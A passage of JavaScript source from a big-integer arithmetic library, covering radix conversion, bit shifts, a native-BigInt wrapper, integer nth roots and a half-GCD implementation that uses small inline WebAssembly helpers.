      var split = BigIntegerInternal.exponentiate(BigIntegerInternal.BigInt(radix), BigIntegerInternal.BigInt(s));
      var q = BigIntegerInternal.divide(this, split);
      var r = BigIntegerInternal.subtract(this, BigIntegerInternal.multiply(q, split));
      var a = r.toString(radix);
      return q.toString(radix) + '0'.repeat(s - a.length) + a;
    }

    var a = this;
    var result = a.sign === 1 ? "-" : "";

    var remainderLength = a.length;
    if (remainderLength === 0) {
      return "0";
    }
    if (remainderLength === 1) {
      result += a.magnitude[0].toString(radix);
      return result;
    }
    var groupLength = 0;
    var groupRadix = 1;
    var limit = fastTrunc(BASE / radix);
    while (groupRadix <= limit) {
      groupLength += 1;
      groupRadix *= radix;
    }
    // assertion
    if (groupRadix * radix <= BASE) {
      throw new RangeError();
    }
    var size = remainderLength + Math.floor((remainderLength - 1) / groupLength) + 1;
    var remainder = createArray(size);
    var n = -1;
    while (++n < remainderLength) {
      remainder[n] = a.magnitude[n];
    }

    var k = size;
    while (remainderLength !== 0) {
      var groupDigit = 0;
      var i = remainderLength;
      while (--i >= 0) {
        var tmp = performDivision(groupDigit, remainder[i], groupRadix);
        var q = tmp.q;
        var r = tmp.r;
        remainder[i] = q;
        groupDigit = r;
      }
      while (remainderLength > 0 && remainder[remainderLength - 1] === 0) {
        remainderLength -= 1;
      }
      k -= 1;
      remainder[k] = groupDigit;
    }
    result += remainder[k].toString(radix);
    while (++k < size) {
      var t = remainder[k].toString(radix);
      result += "0".repeat(groupLength - t.length) + t;
    }
    return result;
  };
  var signedRightShift = function (x, n) {
    // (!) it should work fast if n ~ size(x) - 53
    if (x.length === 0) {
      return x;
    }
    var shift = Math.floor(n / BASELOG2);
    var length = x.length - shift;
    if (length <= 0) {
      if (x.sign === 1) {
        var minusOne = createArray(1);
        minusOne[0] = 1;
        return createBigInteger(1, minusOne, 1);
      }
      return createBigInteger(0, createArray(0), 0);
    }
    var digits = createArray(length + (x.sign === 1 ? 1 : 0));
    for (var i = 0; i < length; i += 1) {
      digits[i] = i + shift < 0 ? 0 : x.magnitude[i + shift];
    }
    n -= shift * BASELOG2;
    var s = exp(2, n);
    var s1 = Math.floor(BASE / s);
    var pr = 0;
    for (var i = length - 1; i >= 0; i -= 1) {
      var q = Math.floor(digits[i] / s);
      var r = digits[i] - q * s;
      digits[i] = q + pr * s1;
      pr = r;
    }
    if (length >= 1 && digits[length - 1] === 0) {
      length -= 1;
    }
    if (x.sign === 1) {
      var hasRemainder = pr > 0;
      for (var i = 0; i < shift && !hasRemainder; i += 1) {
        hasRemainder = x.magnitude[i] !== 0;
      }
      if (hasRemainder) {
        if (length === 0) {
          length += 1;
          digits[0] = 1;
        } else {
          // subtract one
          var i = 0;
          while (i < length && digits[i] === BASE - 1) {
            digits[i] = 0;
            i += 1;
          }
          if (i < length) {
            digits[i] += 1;
          } else {
            length += 1;
            digits[i] = 1;
          }
        }
      }
    }
    return createBigInteger(x.sign, digits, length);
  };
  BigIntegerInternal.signedRightShift = function (x, n) {
    return signedRightShift(x, BigIntegerInternal.toNumber(n));
  };
  BigIntegerInternal.leftShift = function (x, n) {
    return signedRightShift(x, 0 - BigIntegerInternal.toNumber(n));
  };
  BigIntegerInternal.prototype.valueOf = function () {
    //throw new TypeError();
    console.error('BigIntegerInternal#valueOf is called');
    return this;
  };

  var Internal = BigIntegerInternal;

  // noinline
  var n = function (f) {
    return function (x, y) {
      return f(x, y);
    };
  };

  var cache = new Array(16 * 2 + 1);
  for (var i = 0; i < cache.length; i += 1) {
    cache[i] = undefined;
  }
  function LastTwoMap() {
    this.a = undefined;
    this.aKey = 0;
    this.b = undefined;
    this.bKey = 0;
    this.last = 0;
  }
  LastTwoMap.prototype.get = function (key) {
    if (this.aKey === key) {
      this.last = 0;
      return this.a;
    }
    if (this.bKey === key) {
      this.last = 1;
      return this.b;
    }
    return undefined;
  };
  LastTwoMap.prototype.set = function (key, value) {
    if (this.last === 0) {
      this.bKey = key;
      this.b = value;
      this.last = 1;
    } else {
      this.aKey = key;
      this.a = value;
      this.last = 0;
    }
  };
  var map = new LastTwoMap(); // to optimize when some number is multiplied by few numbers sequencely
  var toNumber = n(function (a) {
    return Internal.toNumber(a);
  });
  var valueOf = function (x) {
    if (typeof x === "number") {
      if (x >= -16 && x <= +16) {
        var value = cache[x + 16];
        if (value == undefined) {
          value = Internal.BigInt(x);
          cache[x + 16] = value;
        }
        return value;
      }
      var value = map.get(x);
      if (value == undefined) {
        value = Internal.BigInt(x);
        map.set(x, value);
      }
      return value;
    }
    return x;
  };
  var toResult = function (x) {
    var value = Internal.toNumber(x);
    if (value >= -9007199254740991 && value <= +9007199254740991) {
      return value;
    }
    return x;
  };
  var add = n(function (x, y) {
    if (typeof x === "number" && x === 0) {
      return y;
    }
    if (typeof y === "number" && y === 0) {
      return x;
    }
    var a = valueOf(x);
    var b = valueOf(y);
    var sum = Internal.add(a, b);
    return typeof x === "number" && typeof y === "number" ? sum : toResult(sum);
  });
  var subtract = n(function (x, y) {
    if (typeof x === "number" && x === 0) {
      return unaryMinus(y);
    }
    // quite good optimization for comparision of big integers
    if (typeof y === "number" && y === 0) {
      return x;
    }
    var a = valueOf(x);
    var b = valueOf(y);
    var difference = Internal.subtract(a, b);
    return typeof x === "number" && typeof y === "number" ? difference : toResult(difference);
  });
  var multiply = n(function (x, y) {
    if (typeof x === "number" && x === 0) {
      return 0;
    }
    if (typeof x === "number" && x === 1) {
      return y;
    }
    if (typeof x === "number" && x === -1) {
      return Internal.unaryMinus(y);
    }
    if (typeof y === "number" && y === 0) {
      return 0;
    }
    if (typeof y === "number" && y === 1) {
      return x;
    }
    if (typeof y === "number" && y === -1) {
      return Internal.unaryMinus(x);
    }
    var a = valueOf(x);
    var b = valueOf(y);
    return Internal.multiply(a, b);
  });
  var divide = n(function (x, y) {
    if (typeof x === "number") {
      return 0;
    }
    if (typeof y === "number" && y === 1) {
      return x;
    }
    if (typeof y === "number" && y === -1) {
      return Internal.unaryMinus(x);
    }
    var a = valueOf(x);
    var b = valueOf(y);
    return toResult(Internal.divide(a, b));
  });
  var remainder = n(function (x, y) {
    if (typeof x === "number") {
      return x;
    }
    if (typeof y === "number" && y === 1) {
      return 0;
    }
    if (typeof y === "number" && y === -1) {
      return 0;
    }
    var a = valueOf(x);
    var b = valueOf(y);
    return toResult(Internal.remainder(a, b));
  });
  var exponentiate = n(function (x, y) {
    if (typeof y === "number") {
      if (y === 0) {
        return 1;
      }
      if (y === 1) {
        return x;
      }
      if (y === 2) {
        return multiply(x, x);
      }
      if (typeof x === "number" && Math.abs(x) > 2 && y >= 0) {
        if (y > 42 && x % 2 === 0) {//TODO: ?
          return multiply(exponentiate(2, y), exponentiate(x / 2, y));
        }
        var k = Math.floor(Math.log(9007199254740991) / Math.log(Math.abs(x) + 0.5));
        if (k >= 2) {
          return multiply(Math.pow(x, y % k), exponentiate(Math.pow(x, k), Math.floor(y / k)));
        }
      }
    }
    var a = valueOf(x);
    var b = valueOf(y);
    var power = Internal.exponentiate(a, b);
    return typeof x === "number" && Math.abs(x) <= 1 ? toResult(power) : power;
  });
  var unaryMinus = n(function (x) {
    var a = valueOf(x);
    return Internal.unaryMinus(a);
  });
  var equal = n(function (x, y) {
    if (typeof x === "number") {
      return false;
    }
    if (typeof y === "number") {
      return false;
    }
    return Internal.equal(x, y);
  });
  var lessThan = n(function (x, y) {
    if (typeof x === "number") {
      return x < Internal.toNumber(y);
    }
    if (typeof y === "number") {
      return Internal.toNumber(x) < y;
    }
    return Internal.lessThan(x, y);
  });
  var greaterThan = n(function (x, y) {
    if (typeof x === "number") {
      return x > Internal.toNumber(y);
    }
    if (typeof y === "number") {
      return Internal.toNumber(x) > y;
    }
    return Internal.greaterThan(x, y);
  });

  function BigInteger() {
  }

  // Conversion from String:
  // Conversion from Number:
  BigInteger.BigInt = function (x) {
    if (typeof x === "number" || typeof x === "string" || typeof x === "bigint") {
      var value = 0 + (typeof x === "number" ? x : Number(x));
      if (value >= -9007199254740991 && value <= +9007199254740991) {
        return value;
      }
    }
    return toResult(Internal.BigInt(x));
  };
  BigInteger.asUintN = function (n, x) {
    if (typeof x === "number" && x >= 0 && n >= 0 && n <= 53) {
      var m = exp(2, n);
      return x - Math.floor(x / m) * m;
    }
    return toResult(Internal.asUintN(n, Internal.BigInt(x)));
  };
  // Conversion to Number:
  BigInteger.toNumber = function (x) {
    if (typeof x === "number") {
      return x;
    }
    return toNumber(x);
  };

  // Arithmetic:
  BigInteger.add = function (x, y) {
    if (typeof x === "string" || typeof y === "string") {
      return x + y;
    }
    if (typeof x === "number" && typeof y === "number") {
      var value = x + y;
      if (value >= -9007199254740991 && value <= +9007199254740991) {
        return value;
      }
    }
    return add(x, y);
  };
  BigInteger.subtract = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      var value = x - y;
      if (value >= -9007199254740991 && value <= +9007199254740991) {
        return value;
      }
    }
    return subtract(x, y);
  };
  BigInteger.multiply = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      var value = 0 + x * y;
      if (value >= -9007199254740991 && value <= +9007199254740991) {
        return value;
      }
    }
    return multiply(x, y);
  };
  BigInteger.divide = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      if (y !== 0) {
        return x === 0 ? 0 : (x > 0 && y > 0) || (x < 0 && y < 0) ? 0 + Math.floor(x / y) : 0 - Math.floor((0 - x) / y);
      }
    }
    return divide(x, y);
  };
  BigInteger.remainder = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      if (y !== 0) {
        return 0 + x % y;
      }
    }
    return remainder(x, y);
  };
  BigInteger.unaryMinus = function (x) {
    if (typeof x === "number") {
      return 0 - x;
    }
    return unaryMinus(x);
  };

  // Comparison:
  BigInteger.equal = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      return x === y;
    }
    return equal(x, y);
  };
  BigInteger.lessThan = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      return x < y;
    }
    return lessThan(x, y);
  };
  BigInteger.greaterThan = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      return x > y;
    }
    return greaterThan(x, y);
  };
  BigInteger.notEqual = function (x, y) {
    return !BigInteger.equal(x, y);
  };
  BigInteger.lessThanOrEqual = function (x, y) {
    return !BigInteger.greaterThan(x, y);
  };
  BigInteger.greaterThanOrEqual = function (x, y) {
    return !BigInteger.lessThan(x, y);
  };

  BigInteger.exponentiate = function (x, y) {
    if (typeof x === "number" && typeof y === "number") {
      if (y >= 0 && (y < 53 || x >= -1 && x <= 1)) { // 53 === log2(9007199254740991 + 1)
        var value = 0 + Math.pow(x, y);
        if (value >= -9007199254740991 && value <= 9007199254740991) {
          return value;
        }
      }
    }
    return exponentiate(x, y);
  };
  BigInteger.signedRightShift = function (x, n) {
    return toResult(Internal.signedRightShift(valueOf(x), valueOf(n)));
  };
  BigInteger.leftShift = function (x, n) {
    return toResult(Internal.leftShift(valueOf(x), valueOf(n)));
  };

  (global || globalThis).BigInteger = BigInteger;
  BigInteger._getInternal = function () {
    return Internal;
  };
  BigInteger._setInternal = function (newInternal) {
    Internal = newInternal;
  };

}(this));

})();
(function () {
"use strict";


  function BigIntWrapper() {
  }
  //var BigIntWrapper = typeof BigInt !== 'undefined' ? BigInt : function () {};
  BigIntWrapper.BigInt = function (x) {
    return BigInt(x);
  };
  BigIntWrapper.asUintN = function (bits, bigint) {
    return BigInt.asUintN(bits, bigint);
  };
  BigIntWrapper.toNumber = function (bigint) {
    return Number(bigint);
  };
  BigIntWrapper.add = function (a, b) {
    return a + b;
  };
  BigIntWrapper.subtract = function (a, b) {
    return a - b;
  };
  BigIntWrapper.multiply = function (a, b) {
    return a * b;
  };
  BigIntWrapper.divide = function (a, b) {
    return a / b;
  };
  BigIntWrapper.remainder = function (a, b) {
    return a % b;
  };
  BigIntWrapper.unaryMinus = function (a) {
    return -a;
  };
  BigIntWrapper.equal = function (a, b) {
    return a === b;
  };
  BigIntWrapper.lessThan = function (a, b) {
    return a < b;
  };
  BigIntWrapper.greaterThan = function (a, b) {
    return a > b;
  };
  BigIntWrapper.notEqual = function (a, b) {
    return a !== b;
  };
  BigIntWrapper.lessThanOrEqual = function (a, b) {
    return a <= b;
  };
  BigIntWrapper.greaterThanOrEqual = function (a, b) {
    return a >= b;
  };
  BigIntWrapper.exponentiate = function (a, b) { // a**b
    if (typeof a !== "bigint" || typeof b !== "bigint") {
      throw new TypeError();
    }
    var n = Number(b);
    if (n < 0) {
      throw new RangeError();
    }
    if (n > Number.MAX_SAFE_INTEGER) {
      var y = Number(a);
      if (y === 0 || y === -1 || y === +1) {
        return y === -1 && Number(b % BigInt(2)) === 0 ? -a : a;
      }
      throw new RangeError();
    }
    if (a === BigInt(2)) {
      return BigInt(1) << b;
    }
    if (n === 0) {
      return BigInt(1);
    }
    var x = a;
    while (n % 2 === 0) {
      n = Math.floor(n / 2);
      x *= x;
    }
    var accumulator = x;
    n -= 1;
    if (n >= 2) {
      while (n >= 2) {
        var t = Math.floor(n / 2);
        if (t * 2 !== n) {
          accumulator *= x;
        }
        n = t;
        x *= x;
      }
      accumulator *= x;
    }
    return accumulator;
  };
  BigIntWrapper.signedRightShift = function (a, n) {
    return a >> n;
  };
  BigIntWrapper.leftShift = function (a, n) {
    return a << n;
  };
  if (Symbol.hasInstance != undefined) {
    Object.defineProperty(BigIntWrapper, Symbol.hasInstance, {
      value: function (a) {
        return typeof a === 'bigint';
      }
    });
  }

  var supportsBigInt = Symbol.hasInstance != undefined &&
                       typeof BigInt !== "undefined" &&
                       BigInt(Number.MAX_SAFE_INTEGER) + BigInt(2) - BigInt(2) === BigInt(Number.MAX_SAFE_INTEGER);

  if (supportsBigInt) {
    // https://twitter.com/mild_sunrise/status/1339174371550760961
    if (((-BigInt('0xffffffffffffffffffffffffffffffff')) >> BigInt(0x40)).toString() !== '-18446744073709551616') { // ((-(Math.pow(2, 128) - 1)) >> 64) !== -1 * 2**64
      supportsBigInt = false; // TODO: partial support (?)
    }
  }
  if (supportsBigInt) {
    try {
      BigInt(Number.MAX_SAFE_INTEGER + 1);
    } catch (error) {
      // Chrome 67
      supportsBigInt = false; // TODO: partial support (?)
    }
  }

  //supportsBigInt = false;//!!!
  if (supportsBigInt) {
    globalThis.JSBI = BigIntWrapper;//!!!
    globalThis.BigInteger._setInternal(BigIntWrapper);
  } else if (globalThis.JSBI == null) {
    globalThis.JSBI = globalThis.BigInteger._getInternal();
  } else {
    globalThis.BigInteger._setInternal(JSBI);
  }

  var SmallBigInt = globalThis.BigInteger;
  self.SmallBigInt = SmallBigInt;
  //self.BigIntWrapper = BigIntWrapper;


})();


(function () {
  "use strict"; // floor(S**(1/n)), S >= 1, n >= 2
  // https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method
  // https://stackoverflow.com/a/15979957/839199y

  function nthRoot(S, n) {
    if (!(S instanceof JSBI) || typeof n !== 'number' || Math.floor(n) !== n || n < 1 || n > Number.MAX_SAFE_INTEGER) {
      throw new RangeError();
    }

    if (n === 1) {
      return S;
    }

    var s = JSBI.toNumber(JSBI.add(S, JSBI.BigInt(0)));

    if (s === 0) {
      return JSBI.BigInt(0);
    }

    if (s < 0) {
      if (n % 2 === 0) {
        throw new RangeError();
      }

      return JSBI.unaryMinus(JSBI.BigInt(nthRoot(JSBI.unaryMinus(S), n)));
    }

    var B = Number.MAX_SAFE_INTEGER + 1;
    var E = Math.floor(B / (n === 2 ? 2 : Math.pow(2, 1 + Math.ceil(Math.log2(Math.log2(B))))));

    if (s < E) {
      //var test = function (n, f) { var i = 1; while (f(i**n - 1) === i - 1 && f(i**n) === i) { i += 1; } var a = i**n; while (f(a - 1) === i) { a -= Math.pow(2, 25); } console.log(n, Math.log2(a), a); };
      //test(2, function (a) { return Math.floor(Math.sqrt(a + 0.5)); });
      //for (var n = 3; n <= 53; n++) { test(n, function (a) { return Math.floor(Math.exp(Math.log(a + 0.5) / n)); }); }
      var g = n === 2 ? Math.floor(Math.sqrt(s + 0.5)) : Math.floor(Math.exp(Math.log(s + 0.5) / n));
      return JSBI.BigInt(g);
    }

    var g = n === 2 ? Math.sqrt(s) : Math.exp(Math.log(s) / n);

    if (g < E) {
      if (Math.floor(g - g / E) === Math.floor(g + g / E)) {
        return JSBI.BigInt(Math.floor(g));
      }

      var y = JSBI.BigInt(Math.floor(g + 0.5));
      return JSBI.lessThan(S, JSBI.exponentiate(y, JSBI.BigInt(n))) ? JSBI.subtract(y, JSBI.BigInt(1)) : y;
    }

    var size = S.toString(16).length * 4; // TODO: bitLength(S)

    if (size <= n) {
      return JSBI.BigInt(1);
    }

    var half = Math.floor((Math.floor(size / n) + 1) / 2);
    var x = JSBI.leftShift(JSBI.add(JSBI.BigInt(nthRoot(JSBI.signedRightShift(S, JSBI.BigInt(half * n)), n)), JSBI.BigInt(1)), JSBI.BigInt(half));
    var xprev = JSBI.unaryMinus(JSBI.BigInt(1));

    do {
      xprev = x;

      if (n === 2) {
        x = JSBI.signedRightShift(JSBI.add(x, JSBI.divide(S, x)), JSBI.BigInt(1));
      } else {
        x = JSBI.divide(JSBI.add(JSBI.multiply(JSBI.BigInt(n - 1), x), JSBI.divide(S, JSBI.exponentiate(x, JSBI.BigInt(n - 1)))), JSBI.BigInt(n));
      }
    } while (JSBI.lessThan(x, xprev));

    return xprev;
  }

  self.nthRoot = nthRoot;
})();


(function () {
  "use strict";
  /*jshint esversion:11*/

  var MAX_SAFE_INTEGER = JSBI.BigInt(Number.MAX_SAFE_INTEGER); //TODO: https://en.wikipedia.org/wiki/Euclidean_algorithm#Method_of_least_absolute_remainders

  function numbersGCD(a, b) {
    while (b > 0) {
      var q = Math.floor(a / b);
      var r = a - q * b;
      a = b;
      b = r;
    }

    return a;
  } // https://webassembly.studio


  var i64gcd = null;
  var url = 'data:application/wasm;base64,AGFzbQEAAAABBwFgAn5+AX4DAgEABQMBAAAHEAIDZ2NkAAAGbWVtb3J5AgAKJAEiAQF+A0AgAUIAUgRAIAAgAYIhAiABIQAgAiEBDAELCyAACw';

  if (typeof WebAssembly !== "undefined" && WebAssembly.instantiateStreaming != null) {
    WebAssembly.instantiateStreaming(fetch(url)).then(function (result) {
      var f = result.instance.exports.gcd; // https://github.com/GoogleChromeLabs/wasm-feature-detect/blob/master/src/detectors/big-int/index.js

      try {
        if (JSBI.equal(f(JSBI.BigInt(0), JSBI.BigInt(0)), JSBI.BigInt(0))) {
          i64gcd = f;
        }
      } catch (error) {
        console.error(error);
      }
    });
  }

  function EuclidsGCD(a, b) {
    while (JSBI.greaterThan(b, MAX_SAFE_INTEGER)) {
      var r = JSBI.remainder(a, b);
      a = b;
      b = r;
    }

    if (JSBI.greaterThan(b, JSBI.BigInt(0))) {
      if (JSBI.greaterThan(a, MAX_SAFE_INTEGER)) {
        var r = JSBI.remainder(a, b);
        a = b;
        b = r;
      }

      return JSBI.BigInt(numbersGCD(JSBI.toNumber(a), JSBI.toNumber(b)));
    }

    return a;
  } // https://github.com/tc39/proposal-bigint/issues/205
  // https://github.com/tc39/ecma262/issues/1729
  // floor(log2(a)) + 1 if a > 0


  function bitLength(a) {
    var s = a.toString(16);
    var c = s.charCodeAt(0) - 0 - '0'.charCodeAt(0);

    if (c <= 0) {
      throw new RangeError();
    }

    return (s.length - 1) * 4 + (32 - Math.clz32(Math.min(c, 8)));
  } // 1 + floor(log2(x))


  function log2(x) {
    var e = 0;

    while (x > 1 << 30) {
      x = Math.floor(x / (1 << 30));
      e += 30;
    }

    e += 32 - Math.clz32(x);
    return e;
  }

  var LOG2MAX = Math.floor(Math.log2(Number.MAX_SAFE_INTEGER + 1));
  var DIGITSIZE = LOG2MAX;
  var DIGITSIZE_BIG = JSBI.BigInt(DIGITSIZE);
  var wasmHelper = null;
  var url2 = 'data:application/wasm;base64,AGFzbQEAAAABDQFgBX5+fn5+BH5+fn4DAgEABwoBBmhlbHBlcgAACpMDAZADBQR+AX8GfgF/BX5CASEFQgAhBkIAIQdCASEIQQQhCQNAIAUhDCAGIQ0gByEOIAghDyACIQsgACECA0AgAiEAIAshAiAMIQUgDSEGIA4hByAPIQggACACfyEKIAAgAoEhCyAHIQwgCCENIAUgCiAHfn0hDiAGIAogCH59IQ9CACAHfSAHIAdCAFMbeSAKeXxCwgBZQgAgCH0gCCAIQgBTG3kgCnl8QsIAWXFCACALIA58VyALIA58IAIgB3xTcUIAIAsgD3xXIAsgD3wgAiAIfFNxcXEhECAQQQBHDQALIAAgBSAGIAUgBlUbfHkhESACIAcgCCAHIAhVG3x5IRIgESASIBEgElMbIRMgE0IBfSETIBNCACATQgBVGyETIAQgEyATIARVGyETIAQgE30hBCABIASHIRQgAyAEhyEVIAEgFCAEhn0hASADIBUgBIZ9IQMgBSAUfiAGIBV+fCAAIBOGfCEAIAcgFH4gCCAVfnwgAiAThnwhAiAJQQFrIQkgCUEARw0ACyAFIAYgByAICwCGAQRuYW1lAn8BABYAAXgBA3hsbwIBeQMDeWxvBAZsb2JpdHMFAUEGAUIHAUMIAUQJAWkKAXELAnkxDAJBMQ0CQjEOAkMxDwJEMRAMc2FtZVF1b3RpZW50EQ14UGx1c01heEFCY2x6Eg15UGx1c01heENEY2x6EwRiaXRzFAR4bG8xFQR5bG8x';

  if (typeof WebAssembly !== "undefined" && WebAssembly.instantiateStreaming != null) {
    WebAssembly.instantiateStreaming(fetch(url2)).then(function (result) {
      var f = result.instance.exports.helper; // https://github.com/GoogleChromeLabs/wasm-feature-detect/blob/master/src/detectors/big-int/index.js

      try {
        var $tmpA_B_C_D = f(JSBI.BigInt(1), JSBI.BigInt(0), JSBI.BigInt(1), JSBI.BigInt(0), JSBI.BigInt(0));
        var A = $tmpA_B_C_D[0];
        var B = $tmpA_B_C_D[1];
        var C = $tmpA_B_C_D[2];
        var D = $tmpA_B_C_D[3];

        if (JSBI.equal(A, JSBI.BigInt(1)) && JSBI.equal(B, JSBI.BigInt(0)) && JSBI.equal(C, JSBI.BigInt(0)) && JSBI.equal(D, JSBI.BigInt(1))) {
          wasmHelper = f;
          DIGITSIZE = 63;
          DIGITSIZE_BIG = JSBI.BigInt(63);
        }
      } catch (error) {
        console.error(error);
      }
    });
  }

  var previousValue = -1; // some terrible optimization as bitLength is slow

  function bitLength2(a) {
    if (previousValue === -1) {
      previousValue = bitLength(a);
      return previousValue;
    }

    if (previousValue <= 1024) {
      var n = JSBI.toNumber(JSBI.BigInt(a));
      var x = Math.log2(n) + 1024 * 4 - 1024 * 4;
      var y = Math.ceil(x);

      if (x !== y) {
        previousValue = y;
        return y;
      }
    }

    var n = JSBI.toNumber(JSBI.signedRightShift(a, JSBI.BigInt(previousValue - DIGITSIZE)));

    if (n < 1 || n >= Number.MAX_SAFE_INTEGER + 1) {
      previousValue = -1;
      return bitLength2(a);
    }

    previousValue = previousValue - DIGITSIZE + log2(n);
    return previousValue;
  } // 2**n


  function exp2(n) {
    if (n < 0) {
      throw new RangeError();
    }

    var result = 1;

    while (n > 30) {
      n -= 30;
      result *= 1 << 30;
    }

    result *= 1 << n;
    return result;
  }

  var doubleDigitMethod = true;

  function helper(X, Y) {
    if (!(X instanceof JSBI) || !(Y instanceof JSBI)) {
      throw new RangeError();
    }

    var x = doubleDigitMethod ? JSBI.signedRightShift(X, DIGITSIZE_BIG) : X;
    var xlo = doubleDigitMethod ? JSBI.asUintN(DIGITSIZE, X) : JSBI.BigInt(0);
    var y = doubleDigitMethod ? JSBI.signedRightShift(Y, DIGITSIZE_BIG) : Y;
    var ylo = doubleDigitMethod ? JSBI.asUintN(DIGITSIZE, Y) : JSBI.BigInt(0);

    if (wasmHelper != null) {
      if (JSBI.equal(y, JSBI.BigInt(0))) {
        return [JSBI.BigInt(1), JSBI.BigInt(0), JSBI.BigInt(0), JSBI.BigInt(1)];
      }

      return wasmHelper(x, xlo, y, ylo, DIGITSIZE_BIG);
    }

    return jsHelper(JSBI.toNumber(x), JSBI.toNumber(xlo), JSBI.toNumber(y), JSBI.toNumber(ylo));
  }

  function jsHelper(x, xlo, y, ylo) {
    // computes the transformation matrix, which is the product of all {{0, 1}, {1, -q}} matrices,
    // where q is the quotient produced by Euclid's algorithm for any pair of integers (a, b),
    // where a within [X << m; ((X + 1) << m) - 1] and b within [Y << m; ((Y + 1) << m) - 1]
    // 2x2-matrix transformation matrix of (x_initial, y_initial) into (x, y):
    var A = 1;
    var B = 0;
    var C = 0;
    var D = 1;
    var lobits = LOG2MAX;

    for (var i = doubleDigitMethod ? 3 : 0; i >= 0; i -= 1) {
      var sameQuotient = y !== 0;

      while (sameQuotient) {
        //console.assert(y > 0);
        var q = Math.floor(+x / y);
        var y1 = x - q * y; // Multiply matrix augmented by column (x, y) by {{0, 1}, {1, -q}} from the right:

        var A1 = C;
        var B1 = D;
        var C1 = A - q * C;
        var D1 = B - q * D; // The quotient for a point (x_initial + alpha, y_initial + beta), where 0 <= alpha < 1 and 0 <= beta < 1:
        // floor((x + A * alpha + B * beta) / (y + C * alpha + D * beta))
        // As the sign(A) === -sign(B) === -sign(C) === sign(D) (ignoring zero entries) the maximum and minimum values are floor((x + A) / (y + C)) and floor((x + B) / (y + D))
        // floor((x + A) / (y + C)) === q  <=>  0 <= (x + A) - q * (y + C) < (y + C)  <=>  0 <= y1 + C1 < y + C
        // floor((x + B) / (y + D)) === q  <=>  0 <= (x + B) - q * (y + D) < (y + D)  <=>  0 <= y1 + D1 < y + D

        sameQuotient = 0 <= y1 + C1 && y1 + C1 < y + C && 0 <= y1 + D1 && y1 + D1 < y + D;

        if (sameQuotient) {
          x = y;
          y = y1;
          A = A1;
          B = B1;
          C = C1;
          D = D1; //gcd.debug(q);
        }
      }

      if (i >= 1) {
        var bits = Math.min(Math.max(LOG2MAX - 0 - log2(Math.max(x + Math.max(A, B), y + Math.max(C, D))), 0), lobits);
        var d = exp2(lobits - bits);
        var xlo1 = Math.floor(xlo / d);
        var ylo1 = Math.floor(ylo / d);
        xlo -= xlo1 * d;
        ylo -= ylo1 * d;
        lobits -= bits;
        var p = exp2(bits);
        x = A * xlo1 + B * ylo1 + x * p;
        y = C * xlo1 + D * ylo1 + y * p;
      }
    }

    return [JSBI.BigInt(A), JSBI.BigInt(B), JSBI.BigInt(C), JSBI.BigInt(D)];
  }

  var SUBQUADRATIC_HALFGCD_THRESHOLD = 4096;

  function matrixMultiply(A1, B1, C1, D1, A, B, C, D) {
    return [JSBI.add(JSBI.multiply(A1, A), JSBI.multiply(B1, C)), JSBI.add(JSBI.multiply(A1, B), JSBI.multiply(B1, D)), JSBI.add(JSBI.multiply(C1, A), JSBI.multiply(D1, C)), JSBI.add(JSBI.multiply(C1, B), JSBI.multiply(D1, D))];
  }

  function halfgcd(a, b, small) {
    //console.assert(a >= b && b >= 0n);
    // the function calculates the transformation matrix for numbers (x, y), where a <= x < a + 1 and b <= y < b + 1
    // seems, this definition is not the same as in https://mathworld.wolfram.com/Half-GCD.html
    // floor((a + 1) / b) < q = floor(a / b) < floor(a / (b + 1))
    // ([A, B], [C, D]) * (a + x, b + y) = (A*(a+x)+B*(b+y), C*(a+x)+D*(b+y)) = (A*a+B*b, C*a+D*b) + (A*x+B*y, C*x+D*y)
    //Note: for debugging it is useful to compare quotients in simple Euclidean algorithms vs quotients here
    if (small) {
      var $tmpA_B_C_D = helper(a, b);
      var A = $tmpA_B_C_D[0];
      var B = $tmpA_B_C_D[1];
      var C = $tmpA_B_C_D[2];
      var D = $tmpA_B_C_D[3];
      return [A, B, C, D, JSBI.BigInt(0), JSBI.BigInt(0)];
    }

    var size = bitLength(a);
    var isSmall = size <= SUBQUADRATIC_HALFGCD_THRESHOLD;
    var $newA = JSBI.BigInt(1);
    var $newB = JSBI.BigInt(0);
    var $newC = JSBI.BigInt(0);
    var $newD = JSBI.BigInt(1);
    var A = $newA;
    var B = $newB;
    var C = $newC;
    var D = $newD; // 2x2 matrix

    var step = 0;

    while (true) {
      // Q(T, a + 1n, b) === Q(T, a, b + 1n)
      step += 1; //console.assert(A * D >= 0 && B * C >= 0 && A * B <= 0 && D * C <= 0);//TODO: why - ?
      // A*(X+Y) = A*X+A*Y
      //var $newa1 = a + A; var $newb1 =  b + C; var a1 = $newa1; var b1 = $newb1; // T * (a_initial + 1n, b_initial);
      //var $newa2 = a + B; var $newb2 =  b + D; var a2 = $newa2; var b2 = $newb2; // T * (a_initial, b_initial + 1n);

      var n = step === 1 ? size : isSmall ? bitLength2(a) : bitLength(a); //if (!isSmall && n <= size * (2 / 3)) { // TODO: ?, the constant is based on some testing with some example
      //  return [A, B, C, D, a, b];
      //}

      var m = JSBI.BigInt(isSmall ? Math.max(0, n - DIGITSIZE * (doubleDigitMethod ? 2 : 1)) : n - Math.floor(size / 2));

      if (step !== 1
      /* && m1 < size / 2*/
      ) {
        //?
        if (JSBI.notEqual(JSBI.signedRightShift(JSBI.add(a, A), m), JSBI.signedRightShift(JSBI.add(a, B), m)) || JSBI.notEqual(JSBI.signedRightShift(JSBI.add(b, C), m), JSBI.signedRightShift(JSBI.add(b, D), m))) {
          return [A, B, C, D, a, b];
        }
      }

      var $tmpM0_M1_M2_M3_transformedAhi_transformedBhi = halfgcd(JSBI.signedRightShift(a, m), JSBI.signedRightShift(b, m), isSmall);
      var M0 = $tmpM0_M1_M2_M3_transformedAhi_transformedBhi[0];
      var M1 = $tmpM0_M1_M2_M3_transformedAhi_transformedBhi[1];
      var M2 = $tmpM0_M1_M2_M3_transformedAhi_transformedBhi[2];
      var M3 = $tmpM0_M1_M2_M3_transformedAhi_transformedBhi[3];
      var transformedAhi = $tmpM0_M1_M2_M3_transformedAhi_transformedBhi[4];
      var transformedBhi = $tmpM0_M1_M2_M3_transformedAhi_transformedBhi[5];
      var A1 = JSBI.BigInt(M0);
